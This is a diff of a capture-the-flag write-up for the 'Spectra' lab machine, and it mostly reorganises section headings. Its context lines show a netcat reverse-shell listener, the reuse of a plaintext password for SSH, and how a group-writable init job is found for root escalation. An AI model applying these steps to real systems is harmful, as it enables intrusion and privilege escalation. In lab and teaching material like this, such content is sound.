@@ -317,6 +317,8 @@ Once the `404.php` file is updated with the reverse shell code, start a netcat l
 
 which will trigger the reverse shell.
 
+### Shell as user nginx
+
 ```bash
 rlwrap nc -nvlp 1234
 
@@ -407,7 +409,7 @@ end script
 
 ---
 
-## Privilege Escalation
+## Foothold
 
 ```bash
 find / -type f -iname passwd 2>/dev/null
@@ -431,6 +433,8 @@ nginx:x:20155:20156::/home/nginx:/bin/bash
 katie:x:20156:20157::/home/katie:/bin/bash
 ```
 
+### Shell as user katie
+
 - Get a shell as `katie`. SSH with `katie:SummerHereWeCome!!`
 
 ```bash
@@ -438,13 +442,15 @@ katie:x:20156:20157::/home/katie:/bin/bash
 ssh katie@spectra.htb
 ```
 
-### Get Flags
-
 ```bash
 # User Flag
 cat /home/katie/user.txt
 e89d2***************************
 ```
+
+---
+
+## Privilege Escalation
 
 ```bash
 groups
@@ -470,6 +476,8 @@ ls -lah /etc/init/test.conf
 ls -lah /etc/init/*.conf | grep rw-rw
 -rw-rw---- 1 root developers  478 Jun 29  2020 /etc/init/test.conf
 ```
+
+### Shell as root
 
 - Since `katie` is in the `developers` groups, `katie` can modify the `test.conf` service
 
